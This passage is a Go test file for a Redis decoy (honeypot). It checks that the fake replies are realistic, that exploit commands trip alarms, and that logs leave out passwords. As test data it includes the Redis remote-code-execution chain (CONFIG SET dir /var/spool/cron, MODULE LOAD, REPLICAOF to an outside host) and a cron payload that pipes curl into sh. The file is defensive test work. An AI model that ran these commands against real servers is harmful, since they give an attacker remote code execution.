package redis

import (
	"net/netip"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/config"
	wire "github.com/rom/xproxy/internal/respwire"
)

// A server that is not there.
//
// The assertions worth making about a fabrication are not "does it answer" but
// "does it answer what the real thing answers". A reply of the wrong shape is
// what a client library reports and what a scanner fingerprints on, so most of
// what follows is about shape: the type marker, the field names, the wording of
// an error.

func decoyFor(t *testing.T, c *config.RedisDeception) *decoy {
	t.Helper()
	d, err := newDecoy(c, "cache")
	if err != nil {
		t.Fatalf("newDecoy: %v", err)
	}
	if d == nil {
		t.Fatal("newDecoy built nothing")
	}
	// A fixed clock, so that a test about a value is about the value and not
	// about when the test ran.
	at := time.Date(2025, 3, 5, 14, 0, 0, 0, time.UTC)
	d.now = func() time.Time { return at }
	d.started = at.Add(-72 * time.Hour)
	d.values.SetClockForTest(func() time.Time { return at })
	return d
}

func answerOf(t *testing.T, d *decoy, c *wire.Command) string {
	t.Helper()
	b, ok := d.answer(c, true)
	if !ok {
		t.Fatalf("%s: the fabrication had no answer", c)
	}
	return string(b)
}

// The handshake every client and every scanner sends first.
func TestTheFabricationAnswersTheOpeningExchange(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy", Version: "7.2.4"})
	for _, tc := range []struct {
		c    *wire.Command
		want string
	}{
		{cmd(t, "PING"), "+PONG\r\n"},
		{cmd(t, "PING", "hello"), "$5\r\nhello\r\n"},
		{cmd(t, "ECHO", "x"), "$1\r\nx\r\n"},
		{cmd(t, "SELECT", "0"), "+OK\r\n"},
		{cmd(t, "SELECT", "99"), "-ERR DB index is out of range\r\n"},
		{cmd(t, "SELECT", "abc"), "-ERR value is not an integer or out of range\r\n"},
		{cmd(t, "COMMAND", "COUNT"), ":240\r\n"},
		{cmd(t, "COMMAND", "DOCS"), "%0\r\n"},
		{cmd(t, "TIME"), "*2\r\n$10\r\n1741183200\r\n$1\r\n0\r\n"},
	} {
		if got := answerOf(t, d, tc.c); got != tc.want {
			t.Errorf("%s: %q, want %q", tc.c, got, tc.want)
		}
	}
}

// HELLO is the one exchange where the reply's *type* has to follow what was
// asked: a client that asked for version 3 and got a version 2 reply reports a
// protocol error and gives up.
func TestHelloAnswersInTheProtocolItWasAskedFor(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	two := answerOf(t, d, cmd(t, "HELLO", "2"))
	if two[0] != wire.TypeArray {
		t.Errorf("HELLO 2 answered with %q", two[0])
	}
	three := answerOf(t, d, cmd(t, "HELLO", "3"))
	if three[0] != wire.TypeMap {
		t.Errorf("HELLO 3 answered with %q", three[0])
	}
	// A map counts pairs, so seven fields is "%7".
	if !strings.HasPrefix(three, "%7\r\n") {
		t.Errorf("HELLO 3 answered %q", three[:8])
	}
	// A bare HELLO is a version 2 handshake.
	if bare := answerOf(t, d, cmd(t, "HELLO")); bare[0] != wire.TypeArray {
		t.Errorf("a bare HELLO answered with %q", bare[0])
	}
	for _, bad := range []string{"4", "1", "abc"} {
		if got := answerOf(t, d, cmd(t, "HELLO", bad)); !strings.HasPrefix(got, "-NOPROTO ") {
			t.Errorf("HELLO %s answered %q", bad, got)
		}
	}
	// The version is in the reply, because it is what a scanner records and
	// what a vulnerability database is indexed by.
	if !strings.Contains(three, d.version) {
		t.Errorf("HELLO 3 did not report the version: %q", three)
	}
}

// INFO: the reply every scanner reads first.
func TestInfoReportsWhatARealServerReports(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy", Version: "7.0.11", Profile: "session-store"})
	body := d.info("")
	for _, want := range []string{
		"# Server\r\n", "redis_version:7.0.11\r\n", "redis_mode:standalone\r\n",
		"# Clients\r\n", "connected_clients:", "# Memory\r\n", "used_memory:",
		"# Persistence\r\n", "# Stats\r\n", "total_commands_processed:",
		"# Replication\r\n", "role:master\r\n", "# Keyspace\r\n", "db0:keys=",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("INFO has no %q", want)
		}
	}
	// A run identifier is forty hexadecimal characters, and it is the same one
	// in the replication section: a server with two of them is not a server.
	runID := fieldOf(t, body, "run_id")
	if len(runID) != 40 {
		t.Errorf("run_id is %d characters: %q", len(runID), runID)
	}
	for _, c := range runID {
		if !strings.ContainsRune("0123456789abcdef", c) {
			t.Fatalf("run_id is not hexadecimal: %q", runID)
		}
	}
	if got := fieldOf(t, body, "master_replid"); got != runID {
		t.Errorf("master_replid %q, run_id %q", got, runID)
	}
	// One section at a time, which is how a monitoring agent asks.
	if s := d.info("server"); !strings.Contains(s, "# Server") || strings.Contains(s, "# Memory") {
		t.Errorf("INFO server returned %q", s)
	}
	if s := d.info("keyspace"); !strings.Contains(s, "db0:keys=") || strings.Contains(s, "# Server") {
		t.Errorf("INFO keyspace returned %q", s)
	}
	// A section nobody has is empty rather than everything, because a server
	// that answered INFO nonsense with its whole state would be odd.
	if s := d.info("nonesuch"); s != "" {
		t.Errorf("INFO nonesuch returned %q", s)
	}
	// And "all" is everything, which is the word a tool sends for it.
	if sectionOf(cmd(t, "INFO", "all")) != "" {
		t.Error("INFO all asked for a section")
	}
}

// The counters that must only rise. A totaliser that went backwards between two
// INFOs is the tell that ends the pretence, and this one is derived from the
// elapsed time rather than sampled so that it cannot.
func TestTheCountersOnlyRise(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	at := time.Date(2025, 3, 5, 14, 0, 0, 0, time.UTC)
	d.started = at
	prev := int64(-1)
	prevUp := -1
	for i := 0; i < 40; i++ {
		now := at.Add(time.Duration(i) * 37 * time.Second)
		d.now = func() time.Time { return now }
		d.values.SetClockForTest(func() time.Time { return now })
		body := d.info("")
		got, err := strconv.ParseInt(fieldOf(t, body, "total_commands_processed"), 10, 64)
		if err != nil {
			t.Fatalf("total_commands_processed: %v", err)
		}
		if got < prev {
			t.Fatalf("the command count went from %d to %d", prev, got)
		}
		prev = got
		up, err := strconv.Atoi(fieldOf(t, body, "uptime_in_seconds"))
		if err != nil {
			t.Fatalf("uptime_in_seconds: %v", err)
		}
		if up < prevUp {
			t.Fatalf("the uptime went from %d to %d", prevUp, up)
		}
		prevUp = up
	}
	if prev <= 1000 {
		t.Errorf("the command count never moved: %d", prev)
	}
}

// fieldOf reads one key:value line out of an INFO body.
func fieldOf(t *testing.T, body, key string) string {
	t.Helper()
	for _, line := range strings.Split(body, "\r\n") {
		if name, value, ok := strings.Cut(line, ":"); ok && name == key {
			return value
		}
	}
	t.Fatalf("INFO has no %s", key)
	return ""
}

// The reconnaissance half of the exploit chain, and the exploit half.
//
// CONFIG GET dir and dbfilename are the two questions that come before
// everything else, because the attack has to know where the server writes and
// what it writes. Answering them plausibly is what makes the CONFIG SET arrive,
// and the CONFIG SET is the message worth having.
func TestConfigAnswersTheReconnaissanceAndAcceptsTheExploit(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	got := answerOf(t, d, cmd(t, "CONFIG", "GET", "dir"))
	if got != "*2\r\n$3\r\ndir\r\n$14\r\n/var/lib/redis\r\n" {
		t.Errorf("CONFIG GET dir: %q", got)
	}
	if got := answerOf(t, d, cmd(t, "CONFIG", "GET", "dbfilename")); !strings.Contains(got, "dump.rdb") {
		t.Errorf("CONFIG GET dbfilename: %q", got)
	}
	// A glob, which is what CONFIG GET * is and what a scanner sends.
	all := answerOf(t, d, cmd(t, "CONFIG", "GET", "*"))
	for _, want := range []string{"dir", "dbfilename", "requirepass", "protected-mode", "maxmemory"} {
		if !strings.Contains(all, want) {
			t.Errorf("CONFIG GET * has no %q", want)
		}
	}
	// A pattern matching nothing is an empty array, not everything.
	if got := answerOf(t, d, cmd(t, "CONFIG", "GET", "no-such-parameter")); got != "*0\r\n" {
		t.Errorf("CONFIG GET of nothing: %q", got)
	}
	// And the exploit: accepted, which is what makes the SAVE that follows
	// arrive.
	if got := answerOf(t, d, cmd(t, "CONFIG", "SET", "dir", "/var/spool/cron")); got != "+OK\r\n" {
		t.Errorf("CONFIG SET: %q", got)
	}
	if got := answerOf(t, d, cmd(t, "SAVE")); got != "+OK\r\n" {
		t.Errorf("SAVE: %q", got)
	}
	// An unknown subcommand is the real wording.
	if got := answerOf(t, d, cmd(t, "CONFIG", "NONSENSE")); !strings.HasPrefix(got, "-ERR Unknown CONFIG subcommand") {
		t.Errorf("CONFIG NONSENSE: %q", got)
	}
}

// The two things the fabrication will not pretend, because a reply that implied
// them would have to keep implying them.
func TestTheFabricationDoesNotPretendToRunCode(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	for _, tc := range []struct {
		c      *wire.Command
		prefix string
	}{
		{cmd(t, "MODULE", "LOAD", "/tmp/exp.so"), "-ERR Error loading the extension"},
		{cmd(t, "EVAL", "return 1", "0"), "-NOSCRIPT "},
		{cmd(t, "EVALSHA", "abc", "0"), "-NOSCRIPT "},
		{cmd(t, "DEBUG", "SEGFAULT"), "-ERR DEBUG command not allowed"},
	} {
		if got := answerOf(t, d, tc.c); !strings.HasPrefix(got, tc.prefix) {
			t.Errorf("%s: %q, want a reply starting %q", tc.c, got, tc.prefix)
		}
	}
	// MODULE LIST is answered, because listing nothing is true.
	if got := answerOf(t, d, cmd(t, "MODULE", "LIST")); got != "*0\r\n" {
		t.Errorf("MODULE LIST: %q", got)
	}
	// SCRIPT LOAD answers a digest and keeps nothing, and EVALSHA of it then
	// says NOSCRIPT -- which is exactly what a server that had evicted the
	// script would say, so the pair is consistent.
	sha := answerOf(t, d, cmd(t, "SCRIPT", "LOAD", "return 1"))
	if !strings.HasPrefix(sha, "$40\r\n") {
		t.Errorf("SCRIPT LOAD: %q", sha)
	}
}

// The keyspace: a function rather than a table, so a sweep of it costs nothing
// and nothing is remembered about who read what.
func TestTheKeyspaceIsConsistentAcrossTheCommandsThatReadIt(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{
		Mode: "decoy", Profile: "session-store", KeyCount: 8,
		Keys: []string{"session:known", "app:config"},
	})
	if len(d.keys) != 10 {
		t.Fatalf("the fabrication holds %d keys: %v", len(d.keys), d.keys)
	}
	// Sorted, so two reads list them in the same order.
	for i := 1; i < len(d.keys); i++ {
		if d.keys[i-1] >= d.keys[i] {
			t.Fatalf("the keyspace is not sorted: %v", d.keys)
		}
	}
	// DBSIZE, KEYS and INFO's keyspace section all count the same keys. A
	// server where they disagreed would be one nobody believes.
	if got := answerOf(t, d, cmd(t, "DBSIZE")); got != ":10\r\n" {
		t.Errorf("DBSIZE: %q", got)
	}
	keys := answerOf(t, d, cmd(t, "KEYS", "*"))
	if !strings.HasPrefix(keys, "*10\r\n") {
		t.Errorf("KEYS *: %q", keys[:6])
	}
	if got := fieldOf(t, d.info("keyspace"), "db0"); !strings.HasPrefix(got, "keys=10,") {
		t.Errorf("INFO keyspace: %q", got)
	}
	// A glob narrows it, and a pattern matching nothing is empty.
	if got := answerOf(t, d, cmd(t, "KEYS", "app:*")); got != "*1\r\n$10\r\napp:config\r\n" {
		t.Errorf("KEYS app:*: %q", got)
	}
	if got := answerOf(t, d, cmd(t, "KEYS", "nothing:*")); got != "*0\r\n" {
		t.Errorf("KEYS nothing:*: %q", got)
	}
	// A key the fabrication holds answers; one it does not is a null bulk
	// string, which is not the same reply as an empty one and which a client
	// library distinguishes.
	if got := answerOf(t, d, cmd(t, "GET", "app:config")); !strings.HasPrefix(got, "$") || got == "$-1\r\n" {
		t.Errorf("GET of a held key: %q", got)
	}
	if got := answerOf(t, d, cmd(t, "GET", "not:here")); got != "$-1\r\n" {
		t.Errorf("GET of a key nobody has: %q", got)
	}
	if got := answerOf(t, d, cmd(t, "TYPE", "not:here")); got != "+none\r\n" {
		t.Errorf("TYPE of a key nobody has: %q", got)
	}
	if got := answerOf(t, d, cmd(t, "EXISTS", "app:config", "not:here")); got != ":1\r\n" {
		t.Errorf("EXISTS: %q", got)
	}
	// TTL says -2 for a key that is not there and -1 for one with no expiry,
	// which are different answers and both wrong if swapped.
	if got := answerOf(t, d, cmd(t, "TTL", "not:here")); got != ":-2\r\n" {
		t.Errorf("TTL of a key nobody has: %q", got)
	}
	if got := answerOf(t, d, cmd(t, "TTL", "app:config")); got != ":-1\r\n" {
		t.Errorf("TTL of a held key: %q", got)
	}
	// Reading the same key twice inside one period gives the same value, which
	// is what a server holding a value does.
	first := answerOf(t, d, cmd(t, "GET", "app:config"))
	if second := answerOf(t, d, cmd(t, "GET", "app:config")); second != first {
		t.Errorf("two reads of one key gave %q and %q", first, second)
	}
}

// SCAN walks the whole keyspace and terminates, which is the contract: a client
// that keeps following the cursor sees every key and then a cursor of zero.
func TestScanWalksTheKeyspaceAndStops(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy", KeyCount: 25})
	seen := map[string]bool{}
	cursor := "0"
	for round := 0; ; round++ {
		if round > 100 {
			t.Fatal("SCAN did not terminate")
		}
		reply := answerOf(t, d, cmd(t, "SCAN", cursor, "COUNT", "10"))
		next, keys := splitScan(t, reply)
		for _, k := range keys {
			if seen[k] {
				t.Errorf("SCAN returned %q twice", k)
			}
			seen[k] = true
		}
		cursor = next
		if cursor == "0" {
			break
		}
	}
	if len(seen) != 25 {
		t.Errorf("SCAN saw %d of 25 keys", len(seen))
	}
	// A cursor past the end terminates rather than erroring, which is what a
	// client that reconnected mid-walk sends.
	if got := answerOf(t, d, cmd(t, "SCAN", "9999")); got != "*2\r\n$1\r\n0\r\n*0\r\n" {
		t.Errorf("SCAN past the end: %q", got)
	}
	// A cursor that is not a number is refused rather than read as zero.
	if got := answerOf(t, d, cmd(t, "SCAN", "abc")); !strings.HasPrefix(got, "-ERR invalid cursor") {
		t.Errorf("SCAN abc: %q", got)
	}
	// COUNT is a number the client chooses, so it is bounded: a fabrication
	// that honoured an enormous one would build a reply of the client's chosen
	// size.
	big := decoyFor(t, &config.RedisDeception{Mode: "decoy", KeyCount: 4096})
	_, keys := splitScan(t, answerOf(t, big, cmd(t, "SCAN", "0", "COUNT", "100000")))
	if len(keys) > 1000 {
		t.Errorf("SCAN with COUNT 100000 returned %d keys", len(keys))
	}
}

// splitScan reads a SCAN reply: the cursor and the keys.
func splitScan(t *testing.T, reply string) (string, []string) {
	t.Helper()
	lines := strings.Split(reply, "\r\n")
	if len(lines) < 4 || lines[0] != "*2" {
		t.Fatalf("not a SCAN reply: %q", reply)
	}
	cursor := lines[2]
	var keys []string
	for i := 5; i < len(lines); i += 2 {
		if lines[i] == "" {
			break
		}
		keys = append(keys, lines[i])
	}
	return cursor, keys
}

// A command nothing has: the real wording, because a scanner that sends a
// nonsense command and reads something else has found the decoy.
func TestAnUnknownCommandIsRedisOwnWording(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	got := answerOf(t, d, cmd(t, "NOTACOMMAND", "a", "b"))
	if !strings.HasPrefix(got, "-ERR unknown command 'NOTACOMMAND', with args beginning with: 'a', 'b', ") {
		t.Errorf("%q", got)
	}
	// The argument echo is bounded: a command with a thousand arguments must
	// not produce a thousand-argument error line.
	many := cmd(t, "NOPE")
	for i := 0; i < 50; i++ {
		many.Args = append(many.Args, []byte("arg"))
	}
	if got := answerOf(t, d, many); len(got) > 200 {
		t.Errorf("an unknown command with fifty arguments produced %d octets", len(got))
	}
	// And the reply is one line, whatever the name was. An error reply is
	// line-delimited, so a terminator inside the echoed name would end it early
	// and the rest would be read as another reply -- a reply built out of a
	// string somebody else chose. Two things stop that, and the test is of both:
	// the reader refuses such a name, so it never arrives --
	if _, err := readCommand("*1\r\n$10\r\nBAD\r\n+PING\r\n"); err == nil {
		t.Error("the reader accepted a command name with a terminator in it")
	}
	// -- and the reply builder sanitises anyway, which is what keeps this
	// correct if the reader's rule ever changes.
	byHand := &wire.Command{Name: "BAD\r\n+PONG", Args: [][]byte{[]byte("x\ny")}}
	if got := string(unknown(byHand)); strings.Count(got, "\r\n") != 1 {
		t.Errorf("a command name with a terminator in it produced %q", got)
	}
}

// readCommand reads one command from a string, for the cases that are about what
// the reader will not accept.
func readCommand(s string) (*wire.Command, error) {
	return wire.NewReader(strings.NewReader(s), 0, 0, 0).Next()
}

// AUTH, which on this protocol is the one command whose arguments are a
// credential.
func TestAuthNeverBecomesACredentialOracle(t *testing.T) {
	// With no password required, the real reply is the one that says so -- and
	// it is the reply a scanner is looking for.
	open := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	if got := answerOf(t, open, cmd(t, "AUTH", "hunter2")); !strings.HasPrefix(got, "-ERR Client sent AUTH") {
		t.Errorf("AUTH on an open instance: %q", got)
	}
	// With one required, every password is accepted. Refusing would say which
	// passwords are wrong, which is the one thing a password list needs.
	closed := decoyFor(t, &config.RedisDeception{Mode: "decoy", RequireAuth: true})
	for _, pw := range []string{"hunter2", "", "correct horse"} {
		c := cmd(t, "AUTH", pw)
		if pw == "" {
			c = cmd(t, "AUTH")
		}
		got := answerOf(t, closed, c)
		if pw == "" {
			if !strings.HasPrefix(got, "-ERR wrong number of arguments") {
				t.Errorf("AUTH with no password: %q", got)
			}
			continue
		}
		if got != "+OK\r\n" {
			t.Errorf("AUTH %q: %q", pw, got)
		}
	}
	// And before AUTH, the real NOAUTH error rather than an answer.
	b, ok := closed.answer(cmd(t, "GET", "x"), false)
	if !ok || !strings.HasPrefix(string(b), "-NOAUTH ") {
		t.Errorf("a command before AUTH: %q", b)
	}
	// HELLO is exempt, because HELLO is how a client authenticates.
	if b, _ := closed.answer(cmd(t, "HELLO", "3"), false); len(b) == 0 || b[0] != wire.TypeMap {
		t.Errorf("HELLO before AUTH: %q", b)
	}
}

// The password is never in the record. A log holding every credential sprayed at
// the estate is a list of the estate's own credentials as often as not.
func TestTheRecordHoldsNoPassword(t *testing.T) {
	for _, tc := range []struct {
		what string
		c    *wire.Command
		has  []string
		not  []string
	}{
		{"a password alone", cmd(t, "AUTH", "hunter2"),
			[]string{"password of 7 octets"}, []string{"hunter2"}},
		{"a user and a password", cmd(t, "AUTH", "admin", "hunter2"),
			[]string{"user admin", "password of 7 octets"}, []string{"hunter2"}},
		{"the payload of a CONFIG SET, which is the whole point", cmd(t, "CONFIG", "SET", "dir", "/var/spool/cron"),
			[]string{"SET", "dir", "/var/spool/cron"}, nil},
		{"a replication target, which names a host they control", cmd(t, "REPLICAOF", "10.9.9.9", "6379"),
			[]string{"10.9.9.9", "6379"}, nil},
	} {
		got := argSummary(tc.c)
		for _, want := range tc.has {
			if !strings.Contains(got, want) {
				t.Errorf("%s: %q has no %q", tc.what, got, want)
			}
		}
		for _, no := range tc.not {
			if strings.Contains(got, no) {
				t.Errorf("%s: %q contains %q", tc.what, got, no)
			}
		}
	}
	// A value carrying a cron entry carries newlines, and a log record built out
	// of them would be several records.
	got := argSummary(cmd(t, "SET", "x", "\n\n*/1 * * * * curl http://10.9.9.9/s|sh\n\n"))
	if strings.ContainsAny(got, "\r\n") {
		t.Errorf("a payload with newlines went into one field as %q", got)
	}
	if !strings.Contains(got, "curl http://10.9.9.9/s|sh") {
		t.Errorf("the payload was not recorded: %q", got)
	}
}

// The tripwires: the remote-code-execution chain, which needs no configuring
// because nothing legitimate sends any of it to a fabricated cache.
func TestTheExploitChainTripsWithoutBeingConfigured(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	for _, c := range []*wire.Command{
		cmd(t, "CONFIG", "SET", "dir", "/tmp"),
		cmd(t, "MODULE", "LOAD", "/tmp/x.so"),
		cmd(t, "SLAVEOF", "10.0.0.1", "6379"),
		cmd(t, "REPLICAOF", "10.0.0.1", "6379"),
		cmd(t, "EVAL", "return 1", "0"),
		cmd(t, "DEBUG", "SEGFAULT"),
		cmd(t, "SAVE"), cmd(t, "BGSAVE"), cmd(t, "FLUSHALL"), cmd(t, "SHUTDOWN"),
		cmd(t, "MIGRATE"), cmd(t, "SCRIPT", "LOAD"), cmd(t, "FUNCTION", "LIST"), cmd(t, "ACL", "LIST"),
	} {
		if !d.tripped(c) {
			t.Errorf("%s did not trip", c)
		}
	}
	// And the ordinary traffic does not, or every visitor would look like an
	// attack.
	for _, c := range []*wire.Command{
		cmd(t, "PING"), cmd(t, "GET", "k"), cmd(t, "SET", "k", "v"), cmd(t, "INFO"),
		cmd(t, "CONFIG", "GET", "dir"), cmd(t, "SCAN", "0"), cmd(t, "HELLO", "3"),
		cmd(t, "MODULE", "LIST"),
	} {
		if c.Name == "MODULE" {
			// MODULE is the one command where the bare name is the tripwire,
			// because MODULE LIST is reconnaissance for MODULE LOAD and there
			// is no legitimate reason to ask a decoy either.
			continue
		}
		if d.tripped(c) {
			t.Errorf("%s tripped", c)
		}
	}
	// A configured tripwire adds to the built-in set rather than replacing it.
	more := decoyFor(t, &config.RedisDeception{Mode: "decoy", Tripwire: []string{"keys", "config get"}})
	if !more.tripped(cmd(t, "KEYS", "*")) {
		t.Error("a configured tripwire did not trip")
	}
	if !more.tripped(cmd(t, "CONFIG", "GET", "dir")) {
		t.Error("a configured name-and-subcommand tripwire did not trip")
	}
	if !more.tripped(cmd(t, "CONFIG", "SET", "dir", "/tmp")) {
		t.Error("configuring one tripwire removed the built-in ones")
	}
}

// What the section refuses to compile, because the alternative is a listener
// that starts and fabricates something nobody meant.
func TestTheDeceptionSectionRefusesWhatCannotWork(t *testing.T) {
	for _, tc := range []struct {
		what  string
		c     *config.RedisDeception
		wants string
	}{
		{"a profile that does not exist",
			&config.RedisDeception{Mode: "decoy", Profile: "memcached"}, "is not a profile"},
		{"a tripwire that is not a command name",
			&config.RedisDeception{Mode: "decoy", Tripwire: []string{"GET key value"}}, "not a command name"},
		{"a tripwire with a character no command has",
			&config.RedisDeception{Mode: "decoy", Tripwire: []string{"GET;DROP"}}, "not a command name"},
		{"a client list that is not one",
			&config.RedisDeception{Mode: "decoy", Clients: []string{"10.0.0.1"}}, "clients"},
	} {
		if _, err := newDecoy(tc.c, "cache"); err == nil {
			t.Errorf("%s: compiled", tc.what)
		} else if !strings.Contains(err.Error(), tc.wants) {
			t.Errorf("%s: %v, want %q", tc.what, err, tc.wants)
		}
	}
	// An absent section, and one switched off, build nothing -- which is what
	// makes every path above a no-op for the listeners that do not use this.
	if d, err := newDecoy(nil, "cache"); d != nil || err != nil {
		t.Errorf("an absent section built %v, %v", d, err)
	}
	off := false
	if d, err := newDecoy(&config.RedisDeception{Mode: "decoy", Enabled: &off}, "cache"); d != nil || err != nil {
		t.Errorf("a disabled section built %v, %v", d, err)
	}
}

// The seed: a decoy that forgot its keys after a restart would be a decoy a
// visitor could find by coming back to one.
func TestTheFabricationIsStableAcrossRestarts(t *testing.T) {
	c := &config.RedisDeception{Mode: "decoy", KeyCount: 16}
	a, b := decoyFor(t, c), decoyFor(t, c)
	if strings.Join(a.keys, ",") != strings.Join(b.keys, ",") {
		t.Error("two listeners of the same name hold different keys")
	}
	if a.runID != b.runID {
		t.Errorf("run identifiers %q and %q", a.runID, b.runID)
	}
	if av, bv := a.value(a.keys[0]), b.value(b.keys[0]); av != bv {
		t.Errorf("one key holds %q and %q", av, bv)
	}
	// And a different listener is a different server, or two decoys in one
	// estate would be recognisably the same one.
	other, err := newDecoy(c, "other-cache")
	if err != nil {
		t.Fatal(err)
	}
	if other.runID == a.runID {
		t.Error("two listeners share a run identifier")
	}
	if strings.Join(other.keys, ",") == strings.Join(a.keys, ",") {
		t.Error("two listeners hold the same keys")
	}
}

// The client list, which is what keeps a fabrication off the traffic it was not
// meant for.
func TestOnlyTheNamedClientsAreLiedTo(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "answer", Clients: []string{"10.9.0.0/24"}})
	if !d.admits(netip.MustParseAddr("10.9.0.5")) {
		t.Error("a client inside the list was not admitted")
	}
	if d.admits(netip.MustParseAddr("10.8.0.5")) {
		t.Error("a client outside the list was admitted")
	}
	if d.policy.Anyone() {
		t.Error("a section with a client list reported that it answers anyone")
	}
	// An empty list in decoy mode is every client, which is what a honeypot
	// wants and what validation warns about.
	any := decoyFor(t, &config.RedisDeception{Mode: "decoy"})
	if !any.admits(netip.MustParseAddr("203.0.113.9")) || !any.policy.Anyone() {
		t.Error("a decoy with no client list did not answer a stranger")
	}
	// A nil decoy admits nobody, which is the listener that has no section.
	var none *decoy
	if none.admits(netip.MustParseAddr("10.9.0.5")) {
		t.Error("a listener with no section admitted a client")
	}
	if none.tripped(cmd(t, "CONFIG", "SET")) {
		t.Error("a listener with no section tripped")
	}
	if _, ok := none.answer(cmd(t, "PING"), true); ok {
		t.Error("a listener with no section answered")
	}
}

// The glob, which is Redis's and not a path's.
//
// This is the one place a shortcut would have been wrong in a way nobody would
// notice: path.Match is the obvious matcher and it will not let a wildcard cross
// a slash. A configured key named "cache:img/logo.png" would then be hidden from
// the KEYS that is supposed to list it, on a protocol where a key is an opaque
// string in which a slash means nothing.
func TestTheGlobIsRedisOwnAndNotAPathsGlob(t *testing.T) {
	for _, tc := range []struct {
		pattern, key string
		want         bool
	}{
		{"*", "anything", true},
		{"*", "", true},
		// The case a path glob gets wrong.
		{"cache:*", "cache:img/logo.png", true},
		{"*/logo.png", "cache:img/logo.png", true},
		{"cache:img/*", "cache:img/logo.png", true},
		// An empty pattern matches nothing: the pattern has to cover the whole
		// key, and an empty one covers nothing. The real server agrees.
		{"", "anything", false},
		{"", "", true},
		// The metacharacters.
		{"session:?", "session:a", true},
		{"session:?", "session:ab", false},
		{"session:[abc]*", "session:b12", true},
		{"session:[abc]*", "session:d12", false},
		{"session:[^abc]*", "session:d12", true},
		{"session:[^abc]*", "session:a12", false},
		{"key:[0-9]", "key:7", true},
		{"key:[0-9]", "key:a", false},
		// A range written backwards is still a range, which is what Redis does
		// rather than matching nothing.
		{"key:[9-0]", "key:7", true},
		// An escape makes a metacharacter literal.
		{`ca\*he`, "ca*he", true},
		{`ca\*he`, "cache", false},
		{`a\\b`, `a\b`, true},
		// An unterminated class is a literal bracket, because a pattern is never
		// invalid on this protocol and matching nothing would hide keys. It is a
		// literal, though, and not a wildcard: it matches a bracket and nothing
		// else.
		{"key:[abc", "key:[abc", true},
		{"key:[abc", "key:xabc", false},
		{"[", "[", true},
		{"[", "x", false},
		// A dash immediately before the closing bracket is a literal dash, not
		// half of a range with nothing after it.
		{"key:[a-]", "key:-", true},
		{"key:[a-]", "key:a", true},
		{"key:[a-]", "key:b", false},
		// A negated class with a range in it, which is both features at once.
		{"key:[^0-9]", "key:a", true},
		{"key:[^0-9]", "key:5", false},
		// Anchoring at both ends: a pattern is not a substring search.
		{"cache", "cache:x", false},
		{"ache:x", "cache:x", false},
		{"*ache:x", "cache:x", true},
		{"cache*", "cache", true},
		// A run of stars costs what one costs and matches the same.
		{"a**b", "axxb", true},
		{"a**b", "ab", true},
		{"a**b", "axxc", false},
	} {
		if got := match(tc.pattern, tc.key); got != tc.want {
			t.Errorf("match(%q, %q) = %v", tc.pattern, tc.key, got)
		}
	}
	// A pattern with a run of stars in it. Each star costs a scan of what is
	// left of the key, so two in a row cost that scan twice over and thirty cost
	// it thirty times over: one small KEYS, and the single thread that serves
	// everybody is gone. The stars are collapsed to one, which makes the extra
	// ones free -- and this is asserted with a deadline rather than by timing,
	// because without the collapsing the call does not return at all and a test
	// that merely waited for it would hang the suite.
	done := make(chan bool, 1)
	go func() {
		done <- match(strings.Repeat("*", 30)+"z", strings.Repeat("abcdefgh", 8))
	}()
	select {
	case got := <-done:
		if got {
			t.Error("a pattern ending in z matched a key that does not")
		}
	case <-time.After(2 * time.Second):
		t.Fatal("a pattern with thirty stars in it did not finish: the run is not being collapsed")
	}

	// And through the command, which is how it is reached: a configured key with
	// a slash in it is listed by the prefix glob that covers it.
	d := decoyFor(t, &config.RedisDeception{
		Mode: "decoy", KeyCount: 0, Keys: []string{"cache:img/logo.png", "cache:plain"},
	})
	if got := answerOf(t, d, cmd(t, "KEYS", "cache:*")); !strings.Contains(got, "cache:img/logo.png") {
		t.Errorf("KEYS cache:* did not list the key with a slash in it: %q", got)
	}
}

// The bounds on the fabrication's own size and on what goes into a record. Each
// is a number that arrives from outside: the configuration, or a command.
func TestTheFabricationIsBounded(t *testing.T) {
	// The keyspace, clamped in the builder as well as refused by validation: a
	// caller building the configuration directly is still a caller.
	big := decoyFor(t, &config.RedisDeception{Mode: "decoy", KeyCount: 9000})
	if len(big.keys) != 4096 {
		t.Errorf("a key count of 9000 built %d keys", len(big.keys))
	}
	neg := decoyFor(t, &config.RedisDeception{Mode: "decoy", KeyCount: -5, Keys: []string{"one"}})
	if len(neg.keys) != 1 {
		t.Errorf("a negative key count built %d keys", len(neg.keys))
	}
	// The record of a command's arguments, which is somebody else's octets going
	// into a log line.
	many := cmd(t, "SET", "k", "a", "b", "c", "d", "e", "f", "g", "h")
	got := argSummary(many)
	if !strings.HasSuffix(got, " ...") {
		t.Errorf("ten arguments were recorded in full: %q", got)
	}
	if n := len(strings.Fields(got)); n > 6 {
		t.Errorf("ten arguments produced %d fields: %q", n, got)
	}
	// A cursor that is not a number, and one that is negative: both refused
	// rather than read as zero, because a negative one would index behind the
	// start of the list.
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy", KeyCount: 8})
	for _, cursor := range []string{"abc", "-5", "-1"} {
		if got := answerOf(t, d, cmd(t, "SCAN", cursor)); !strings.HasPrefix(got, "-ERR invalid cursor") {
			t.Errorf("SCAN %s: %q", cursor, got)
		}
	}
	// A database index below the range, which is a different check from one
	// above it and would otherwise be accepted.
	for _, db := range []string{"-1", "16", "99"} {
		if got := answerOf(t, d, cmd(t, "SELECT", db)); !strings.HasPrefix(got, "-ERR DB index") {
			t.Errorf("SELECT %s: %q", db, got)
		}
	}
	// A walk that covers the whole keyspace in one round ends at cursor zero
	// rather than at a cursor one past the end: a client that followed the
	// latter would make one more round trip than it needed to, and one that
